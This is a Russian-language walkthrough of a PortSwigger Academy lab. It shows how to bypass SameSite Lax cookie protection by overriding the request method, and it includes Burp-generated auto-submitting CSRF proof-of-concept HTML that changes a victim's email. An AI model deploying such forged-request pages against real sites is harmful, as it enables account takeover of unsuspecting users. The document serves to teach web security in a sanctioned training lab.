Залогинимся под `wiener:peter`

Включим `proxy` -> `intercept` -> `intercept is on`

и сменим почтвый ящик на `change@me.com`

отправим данный запрос в `Repeater`, а сам запрос дропнем
```
POST /my-account/change-email HTTP/2
...
email=change%40me.com
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/7.%20SameSite%20Lax%20bypass%20via%20method%20override/pics%20for%20walkthrough/1.png)

Теперь отправимся в `Repeater` и все таки отправим данный запрос

нажмем на запрос `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC `
и в `options` обязательно выберем галку `include auto-submit script`


и получим следующий PoC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aac0020040d8662841b4a1d00e100d7.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/7.%20SameSite%20Lax%20bypass%20via%20method%20override/pics%20for%20walkthrough/2.png)

Изменим PoC, чтобы он отправлял `GET` запрос как основной, но внутри прокинем `POST` запрос с нашим намерением изменить почту
добавив строку
```
<input type="hidden" name="_method" value="POST">
```
В итоге получив следующий PoC:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aac0020040d8662841b4a1d00e100d7.web-security-academy.net/my-account/change-email" method="GET">
	<input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="change2&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Перейдем в `exploit server`, нажмем `store` и `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/7.%20SameSite%20Lax%20bypass%20via%20method%20override/pics%20for%20walkthrough/3.png)